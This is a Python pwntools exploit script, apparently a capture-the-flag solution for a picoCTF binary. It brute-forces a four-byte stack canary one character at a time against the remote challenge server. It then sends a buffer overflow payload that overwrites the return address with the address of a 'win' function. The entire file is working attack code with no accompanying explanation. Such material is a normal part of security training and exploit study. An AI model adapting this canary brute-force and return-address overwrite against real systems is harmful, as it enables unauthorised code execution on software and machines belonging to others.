#!/usr/bin/python3

from pwn import *

import time

vuln = ELF('./vuln') 
win = vuln.symbols['win']

canary_at = 64
canary_size = 4
canary = ''
eip_at = 84

is_local = False

def get_process(is_local):
    if is_local:
        return process('./vuln')
    return remote('saturn.picoctf.net', 59775)

# Get canary
for canary_found in range(canary_size):
    for char in string.printable:
        p = get_process(is_local)
        payload = b'A' * canary_at
        payload += canary.encode()
        payload += char.encode()
        tmp_buff_size = canary_at + len(canary) + 1
        p.recvuntil(b'How Many Bytes will You Write Into the Buffer?')
        p.sendline(str(tmp_buff_size).encode())
        p.recvuntil(b'Input> ')
        p.sendline(payload)
        result = p.recvall()
        if b"Now Where's the Flag?" in result:
            canary += char
            break

print(f'canary is {canary}')
print(f'address of win is {hex(win)}')

payload = b'A' * canary_at
payload += canary.encode()
payload += b'A' * (eip_at - canary_at - canary_size)
payload += p32(win)

p = get_process(is_local)
res = p.recvuntil(b'How Many Bytes will You Write Into the Buffer?')
# eip_at + size of win's address = 92 
p.sendline(str(92).encode())
p.recvuntil(b'Input> ')
print(f'Sending payload: {payload}')
p.sendline(payload)
result = p.recvall(timeout=3)
print(result)
